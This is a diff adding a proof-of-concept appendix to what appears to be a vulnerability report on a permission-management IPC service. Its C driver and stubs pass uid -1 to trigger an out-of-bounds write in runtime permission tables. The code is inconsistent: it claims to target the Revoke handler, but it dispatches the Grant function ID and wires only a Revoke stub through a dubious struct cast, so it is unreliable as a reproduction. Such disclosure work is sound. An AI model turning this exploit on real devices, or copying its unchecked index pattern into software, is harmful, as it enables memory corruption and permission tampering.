@@ -133,3 +133,109 @@ static void ReplyRevokeRuntimePermission(const void *origin, IpcIo *req, IpcIo *
     WriteInt32(reply, ret);
 }
 ```
+
+---
+
+## 附录：PoC 源码
+
+### test_driver.c
+
+```c
+/*
+ * Target-Compile PoC: ReplyRevokeRuntimePermission OOB Write (CWE-129)
+ * Method: Links against real pms_server_internal.o compiled from source
+ *
+ * Trigger path:
+ *   Invoke (IPC dispatch, funcId=ID_GRANT_RUNTIME=13)
+ *     → ReplyGrantRuntimePermission(origin, req, reply, api)
+ *       → ReadInt64(req, &uid)  — uid = -1
+ *       → api->GrantRuntimePermission(uid, permName) → OOB write
+ */
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+#include "pms_types.h"
+#include "serializer.h"
+#include "samgr_lite.h"
+#include "iproxy_server.h"
+
+extern int32_t Invoke(IServerProxy *iProxy, int funcId, void *origin, IpcIo *req, IpcIo *reply);
+
+#define PERMISSION_TABLE_SIZE 8
+int32_t g_permission_table[PERMISSION_TABLE_SIZE] = {0};
+
+static int32_t StubRevokeRuntimePermission(int64_t uid, const char *permName)
+{
+    printf("[PoC] RevokeRuntimePermission: uid=%lld\n", (long long)uid);
+    g_permission_table[uid] = 0;  /* OOB WRITE */
+    return 0;
+}
+
+typedef struct {
+    int32_t (*CheckPermission)(int64_t uid, const char *permName);
+    int32_t (*GrantPermission)(const char *id, const char *permName);
+    int32_t (*RevokePermission)(const char *id, const char *permName);
+    int32_t (*GrantRuntimePermission)(int64_t uid, const char *permName);
+    int32_t (*RevokeRuntimePermission)(int64_t uid, const char *permName);
+    int32_t (*UpdatePermissionFlags)(const char *id, const char *permName, int flags);
+} InnerPermLiteApi;
+
+int main(void)
+{
+    uint8_t req_buffer[128];
+    memset(req_buffer, 0, sizeof(req_buffer));
+    size_t offset = 0;
+
+    int64_t uid = -1;  /* OOB index */
+    memcpy(req_buffer + offset, &uid, sizeof(int64_t)); offset += sizeof(int64_t);
+
+    const char *permName = "ohos.permission.CAMERA";
+    uint32_t permLen = strlen(permName);
+    memcpy(req_buffer + offset, &permLen, 4); offset += 4;
+    memcpy(req_buffer + offset, permName, permLen + 1); offset += permLen + 1;
+
+    IpcIo req, reply;
+    uint8_t reply_buffer[64];
+    IpcIoInit(&req, req_buffer, offset, 0);
+    req.bufferCur = req.bufferBase;
+    req.bufferLeft = offset;
+    IpcIoInit(&reply, reply_buffer, sizeof(reply_buffer), 0);
+
+    InnerPermLiteApi api = {0};
+    api.RevokeRuntimePermission = StubRevokeRuntimePermission;
+
+    /* ID_GRANT_RUNTIME = 13 (enum: ID_CHECK=10, ID_GRANT=11, ID_REVOKE=12, ID_GRANT_RUNTIME=13) */
+    int32_t ret = Invoke((IServerProxy *)&api, 13, NULL, &req, &reply);
+    return 0;
+}
+```
+
+### pms_stubs.c
+
+```c
+#include <stdint.h>
+#include <stdio.h>
+
+#define MAX_UID_COUNT 64
+static int32_t g_perm_table[MAX_UID_COUNT] = {0};
+
+int32_t CheckPermissionStat(int64_t uid, const char *permName) {
+    return g_perm_table[uid];
+}
+
+int32_t GrantPermission(const char *id, const char *permName) { return 0; }
+int32_t RevokePermission(const char *id, const char *permName) { return 0; }
+
+int32_t GrantRuntimePermission(int64_t uid, const char *permName) {
+    g_perm_table[uid] = 1;  /* OOB when uid out of range */
+    return 0;
+}
+
+int32_t RevokeRuntimePermission(int64_t uid, const char *permName) {
+    g_perm_table[uid] = 0;  /* OOB when uid out of range */
+    return 0;
+}
+
+int32_t UpdatePermissionFlags(const char *id, const char *permName, int flags) { return 0; }
+```
